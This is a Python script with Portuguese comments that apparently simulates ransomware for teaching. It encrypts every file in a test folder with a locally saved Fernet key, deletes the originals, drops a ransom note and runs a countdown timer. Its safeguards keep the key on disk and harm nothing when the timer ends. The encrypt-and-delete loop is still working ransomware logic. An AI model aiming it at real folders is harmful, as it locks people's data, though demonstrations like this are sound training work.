import os
import glob
import random
import threading
import time
from cryptography.fernet import Fernet
from nota_resgate import criar_nota


# =============================================================================
# ARTES ASCII
# =============================================================================

ASCII_ARTS = [
    r"""
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
    """,
    r"""
 _      ___   ___ _  _____ ___
| |    / _ \ / __| |/ / __|   \
| |__ | (_) | (__| ' <| _|| |) |
|____| \___/ \___|_|\_\___|___/
    """,
    r"""
  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
  ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝
    """,
]


# =============================================================================
# CONFIGURAÇÕES
# =============================================================================

PASTA_ALVO      = "./arquivos_teste"
EXTENSAO_LOCKED = ".locked"
ARQUIVO_CHAVE   = "chave.key"
MINUTOS_TIMER   = 2


# =============================================================================
# FUNÇÕES
# =============================================================================

def gerar_e_salvar_chave() -> bytes:
    """Gera uma chave Fernet (AES-128) e a salva em disco."""
    chave = Fernet.generate_key()
    if os.path.exists(ARQUIVO_CHAVE):
        raise FileExistsError(
            f"'{ARQUIVO_CHAVE}' já existe. Preserve a chave da execução anterior."
        )
    with open(ARQUIVO_CHAVE, "xb") as f:
        f.write(chave)
    return chave


def criptografar_arquivo(caminho: str, fernet: Fernet) -> None:
    """Criptografa um arquivo e o renomeia com a extensão .locked."""
    with open(caminho, "rb") as f:
        dados = f.read()

    novo_caminho = caminho + EXTENSAO_LOCKED
    with open(novo_caminho, "wb") as f:
        f.write(fernet.encrypt(dados))

    os.remove(caminho)
    print(f"  [+] {os.path.basename(caminho)} → {os.path.basename(novo_caminho)}")


def finalizar_simulacao() -> None:
    """
    Callback do timer: encerra a simulação sem apagar dados ou chave.
    """
    print("\n\n" + "=" * 50)
    print("  ⚠️  TEMPO ESGOTADO.")
    print("=" * 50)

    print("  [SIMULAÇÃO] Nenhum arquivo ou chave será apagado.")
    print("  O programa continuará aguardando uma ação no terminal.\n")


def contar_regressivamente(total_segundos: int, evento_parar: threading.Event) -> None:
    """Exibe a contagem regressiva em tempo real, atualizando a mesma linha."""
    for restante in range(total_segundos, -1, -1):
        if evento_parar.is_set():
            break
        mm, ss = divmod(restante, 60)
        print(f"\r  ⏳ Tempo restante: {mm:02d}:{ss:02d} ", end="", flush=True)
        time.sleep(1)

    if not evento_parar.is_set():
        print("\r  ⏳ Tempo restante: 00:00")


def exibir_nota_terminal(minutos: int) -> None:
    """Exibe o resumo da situação no terminal."""
    print("=" * 50)
    print("     !! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS !!")
    print("=" * 50)
    print(f"""
  Todos os seus arquivos foram bloqueados.
  Consulte o arquivo LEIA_ME.txt na pasta de teste.

   Você tem {minutos} minuto(s) para agir.

  [SIMULAÇÃO EDUCACIONAL — NENHUM DANO REAL]
""")
    print("=" * 50)


# =============================================================================
# FLUXO PRINCIPAL
# =============================================================================

def main():
    if not os.path.isdir(PASTA_ALVO):
        print(f"[ERRO] Pasta '{PASTA_ALVO}' não encontrada.")
        return

    arquivos = [
        f for f in glob.glob(os.path.join(PASTA_ALVO, "*"))
        if not f.endswith(EXTENSAO_LOCKED)
        and not f.endswith(".key")
        and not f.endswith("LEIA_ME.txt")
        and os.path.isfile(f)
    ]

    if not arquivos:
        print("[AVISO] Nenhum arquivo encontrado para criptografar.")
        return

    if os.path.exists(ARQUIVO_CHAVE):
        print(f"[ERRO] '{ARQUIVO_CHAVE}' já existe; não será sobrescrita.")
        return

    if any(f.endswith(EXTENSAO_LOCKED) for f in glob.glob(os.path.join(PASTA_ALVO, "*"))):
        print("[ERRO] Já existem arquivos .locked na pasta de teste; interrompendo.")
        return

    print(random.choice(ASCII_ARTS))

    try:
        chave = gerar_e_salvar_chave()
    except OSError as erro:
        print(f"[ERRO] Não foi possível criar a chave: {erro}")
        return
    fernet = Fernet(chave)
    print(f"[*] Chave gerada e salva em: {ARQUIVO_CHAVE}\n")

    print("[*] Iniciando criptografia...\n")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, fernet)
    print(f"\n[*] {len(arquivos)} arquivo(s) criptografado(s).\n")

    criar_nota(PASTA_ALVO)

    segundos = MINUTOS_TIMER * 60
    evento_parar = threading.Event()

    timer = threading.Timer(segundos, finalizar_simulacao)
    timer.start()

    thread_countdown = threading.Thread(
        target=contar_regressivamente,
        args=[segundos, evento_parar],
        daemon=True
    )
    thread_countdown.start()

    exibir_nota_terminal(MINUTOS_TIMER)

    input("\n  Pressione ENTER e execute o decrypt.py para recuperar os arquivos\n")

    evento_parar.set()
    timer.cancel()
    print("\n Timer cancelado. Execute o decrypt.py para recuperar os arquivos.")


if __name__ == "__main__":
    main()
